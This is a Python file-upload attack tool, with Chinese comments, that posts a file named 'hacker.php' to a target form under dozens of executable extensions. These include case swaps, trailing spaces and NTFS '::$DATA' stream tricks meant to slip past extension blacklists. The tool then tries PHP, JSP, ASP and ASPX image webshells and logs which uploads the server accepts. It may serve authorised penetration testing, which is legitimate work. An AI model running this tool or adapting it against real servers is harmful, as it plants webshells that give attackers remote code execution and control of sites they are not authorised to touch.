import requests
from requests_toolbelt.multipart.encoder import MultipartEncoder
import re
import logging

# 设置日志
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')


class FileUploadScanner:
    success_upload_list = []

    def __init__(self, black_dict=None, image_shell_list=None, flag="success!", rever_flag="fair"):
        if black_dict is None:
            black_dict = {
                'ASP/ASPX': [
                    'asp', 'aspx', 'asa', 'asax', 'ascx', 'ashx', 'asmx',
                    'ASP', 'ASPX', 'ASA', 'ASAX', 'ASCX', 'ASHX', 'ASMX',
                    'asp ', 'aspx ', 'asa ', 'asax ', 'ascx ', 'ashx ', 'asmx ',
                    'ASP ', 'ASPX ', 'ASA ', 'ASAX ', 'ASCX ', 'ASHX ', 'ASMX ',
                    'asp::$DATA', 'aspx::$DATA', 'asa::$DATA', 'asax::$DATA', 'ascx::$DATA', 'ashx::$DATA',
                    'asmx::$DATA',
                    'ASP::$DATA', 'ASPX::$DATA', 'ASA::$DATA', 'ASAX::$DATA', 'ASCX::$DATA', 'ASHX::$DATA',
                    'ASMX::$DATA'
                ],
                'PHP': [
                    'php', 'php5', 'php4', 'php3', 'php2', 'phtml', 'pht',
                    'PHP', 'PHP5', 'PHP4', 'PHP3', 'PHP2', 'PHTML', 'PHT',
                    'php ', 'php5 ', 'php4 ', 'php3 ', 'php2 ', 'phtml ', 'pht ',
                    'PHP ', 'PHP5 ', 'PHP4 ', 'PHP3 ', 'PHP2 ', 'PHTML ', 'PHT ',
                    'php::$DATA', 'php5::$DATA', 'php4::$DATA', 'php3::$DATA', 'php2::$DATA', 'phtml::$DATA',
                    'pht::$DATA',
                    'PHP::$DATA', 'PHP5::$DATA', 'PHP4::$DATA', 'PHP3::$DATA', 'PHP2::$DATA', 'PHTML::$DATA',
                    'PHT::$DATA'
                ],
                'HTACCESS': [
                    'htaccess',
                    'HTACCESS',
                    'htaccess ',
                    'HTACCESS ',
                    'htaccess::$DATA',
                    'htaccess::$DATA',
                    'HTACCESS::$DATA'
                ],
                'JSP': [
                    'jsp', 'jspx', 'jsf', 'jsw', 'jsv', 'jspf', 'jtml',
                    'JSP', 'JSPX', 'JSF', 'JSW', 'JSV', 'JSPF', 'JTML',
                    'jsp ', 'jspx ', 'jsf ', 'jsw ', 'jsv ', 'jspf ', 'jtml ',
                    'JSP ', 'JSPX ', 'JSF ', 'JSW ', 'JSV ', 'JSPF ', 'JTML ',
                    'jsp::$DATA', 'jspx::$DATA', 'jsf::$DATA', 'jsw::$DATA', 'jsv::$DATA', 'jspf::$DATA', 'jtml::$DATA',
                    'JSP::$DATA', 'JSPX::$DATA', 'JSF::$DATA', 'JSW::$DATA', 'JSV::$DATA', 'JSPF::$DATA', 'JTML::$DATA'
                ],
                'Perl': [
                    'pl', 'pm',
                    'PL', 'PM',
                    'pl ', 'pm ',
                    'PL ', 'PM ',
                    'pl::$DATA', 'pm::$DATA',
                    'PL::$DATA', 'PM::$DATA'
                ],
                'Python': [
                    'py',
                    'PY',
                    'py ',
                    'PY ',
                    'py::$DATA',
                    'PY::$DATA'
                ],
                'Ruby': [
                    'rb',
                    'RB',
                    'rb ',
                    'RB ',
                    'rb::$DATA',
                    'RB::$DATA'
                ],
                'Shell': [
                    'sh',
                    'SH',
                    'sh ',
                    'SH ',
                    'sh::$DATA',
                    'SH::$DATA'
                ],
                'SHTML': [
                    'shtml', 'shtm', 'stm',
                    'SHTML', 'SHTM', 'STM',
                    'shtml ', 'shtm ', 'stm ',
                    'SHTML ', 'SHTM ', 'STM ',
                    'shtml::$DATA', 'shtm::$DATA', 'stm::$DATA',
                    'SHTML::$DATA', 'SHTM::$DATA', 'STM::$DATA'
                ],
                'ColdFusion': [
                    'cfm', 'cfc',
                    'CFML', 'CFC',
                    'cfm ', 'cfc ',
                    'CFML ', 'CFC ',
                    'cfm::$DATA', 'cfc::$DATA',
                    'CFML::$DATA', 'CFC::$DATA'
                ],
                'Executables': [
                    'dll', 'exe', 'msi',
                    'DLL', 'EXE', 'MSI',
                    'dll ', 'exe ', 'msi ',
                    'DLL ', 'EXE ', 'MSI ',
                    'dll::$DATA', 'exe::$DATA', 'msi::$DATA',
                    'DLL::$DATA', 'EXE::$DATA', 'MSI::$DATA'
                ],
                'XHTML': [
                    'xhtml', 'xht',
                    'XHTML', 'XHT',
                    'xhtml ', 'xht ',
                    'XHTML ', 'XHT ',
                    'xhtml::$DATA', 'xht::$DATA',
                    'XHTML::$DATA', 'XHT::$DATA'
                ],
                'Apache': [
                    'htaccess', 'htpasswd',
                    'HTACCESS', 'HTPASSWD',
                    'htaccess ', 'htpasswd ',
                    'HTACCESS ', 'HTPASSWD ',
                    'htaccess::$DATA', 'htpasswd::$DATA',
                    'HTACCESS::$DATA', 'HTPASSWD::$DATA'
                ],
                'Config': [
                    'config',
                    'CONFIG',
                    'config ',
                    'CONFIG ',
                    'config::$DATA',
                    'CONFIG::$DATA'
                ],
                'Includes': [
                    'inc', 'include', 'tpl',
                    'INC', 'INCLUDE', 'TPL',
                    'inc ', 'include ', 'tpl ',
                    'INC ', 'INCLUDE ', 'TPL ',
                    'inc::$DATA', 'include::$DATA', 'tpl::$DATA',
                    'INC::$DATA', 'INCLUDE::$DATA', 'TPL::$DATA'
                ],
                'Templates': [
                    'tmpl',
                    'TMPL',
                    'tmpl ',
                    'TMPL ',
                    'tmpl::$DATA',
                    'TMPL::$DATA'
                ],
                'Flash': [
                    'swf',
                    'SWF',
                    'swf ',
                    'SWF ',
                    'swf::$DATA',
                    'SWF::$DATA'
                ],
                'JavaServer Pages': [
                    'jspf', 'jspx', 'jsw', 'jsv', 'jspa',
                    'JSPF', 'JSPX', 'JSW', 'JSV', 'JSPA',
                    'jspf ', 'jspx ', 'jsw ', 'jsv ', 'jspa ',
                    'JSPF ', 'JSPX ', 'JSW ', 'JSV ', 'JSPA ',
                    'jspf::$DATA', 'jspx::$DATA', 'jsw::$DATA', 'jsv::$DATA', 'jspa::$DATA',
                    'JSPF::$DATA', 'JSPX::$DATA', 'JSW::$DATA', 'JSV::$DATA', 'JSPA::$DATA'
                ]
            }

        if image_shell_list is None:
            image_shell_list = {
                'php': open("image_shell/php_image_webshell.png", 'rb'),
                'jsp': open("image_shell/jsp_image_webshell.png", 'rb'),
                'asp': open("image_shell/asp_image_webshell.png", 'rb'),
                'aspx': open("image_shell/aspx_image_webshell.png", 'rb')
            }
        self.black_dict = black_dict
        self.flag = flag
        self.rever_flag = rever_flag
        self.image_shell_list = image_shell_list

    def is_upload_success(self, url: str, cookie: dict = None, header: dict = None, multipart: MultipartEncoder = None):
        logging.info("正在请求 %s", url)
        try:
            resp = requests.post(url,
                                 headers=header,
                                 cookies=cookie,
                                 data=multipart,
                                 timeout=(3, 10),
                                 allow_redirects=False
                                 )
        except requests.exceptions.ReadTimeout:
            logging.error("%s 请求超时", url)
            return False
        except requests.exceptions.ConnectionError:
            logging.error("%s 请求连接失败", url)
            return False
        except requests.exceptions.HTTPError as e:
            logging.error("%s 发生HTTP错误: %s", url, e)
            return False

        status_code = resp.status_code
        if status_code == 301:
            logging.warning("%s 请求重定向", url)
            return False
        elif status_code == 302:
            logging.warning("%s 需要身份凭证", url)
            return False

        if self.flag in resp.text or self.rever_flag in resp.text:
            logging.info("文件上传成功")
            return True
        else:
            logging.info("文件上传失败")
            return False

    def check_support(self, program_language):
        if program_language in self.black_dict.keys():
            return False
        else:
            return True

    def check_script_extension(self, program_language: str, url: str, cookie: dict = None, header: dict = None,
                               multipart_data: dict = None, file_data_key: str = None):
        script_type_change = program_language.lower() if program_language.isupper() else program_language.upper()
        regex = re.compile(r'\b(%s|%s)\b' % (program_language, script_type_change), re.IGNORECASE)

        if self.check_support(program_language.upper()):
            logging.info("暂不支持此种程序类型")
            return

        # 打开文件
        with open('hacker.php', 'rb') as file:
            # 遍历脚本后缀黑名单
            for key, suffixes in self.black_dict.items():
                if regex.search(key):
                    logging.info("检测到 %s 类型文件，将检测如下后缀: %s", key, suffixes)
                    # 遍历指定程序可执行文件后缀
                    for suffix in suffixes:
                        # 构建文件上传基本载荷
                        custom_fields = multipart_data.copy() if multipart_data else {}
                        custom_fields[file_data_key] = (
                            'hacker.%s' % suffix, file, 'application/octet-stream')  # 动态设置MIME类型
                        multipart = MultipartEncoder(fields=custom_fields)
                        header['Content-Type'] = multipart.content_type

                        # 判断是否上传成功
                        if self.is_upload_success(url, cookie, header, multipart):
                            logging.info("检测到 .%s 后缀文件可上传", suffix)
                            self.success_upload_list.append(suffix)
                        else:
                            logging.info("未检测到 .%s 后缀文件上传漏洞", suffix)
        logging.info("检测完毕")
        logging.info("可上传的脚本后缀列表为：%s", self.success_upload_list)

    def check_shell_type(self, program_language):
        if program_language in self.image_shell_list.keys():
            return True
        else:
            return False

    def check_image_shell(self, program_language: str, url: str, cookie: dict = None, header: dict = None,
                          multipart_data: dict = None, file_data_key: str = None):
        if self.check_shell_type(program_language):
            logging.info("存在该种图片马")

            custom_fields = multipart_data
            custom_fields[file_data_key] = ('hacker.png', self.image_shell_list[program_language], 'image/png')
            multipart = MultipartEncoder(fields=custom_fields)

            header['Content-Type'] = multipart.content_type

            return self.is_upload_success(url, cookie, header, multipart)
        else:
            logging.info("不在已有的图片马的列表中：%s", list(self.image_shell_list.keys()))
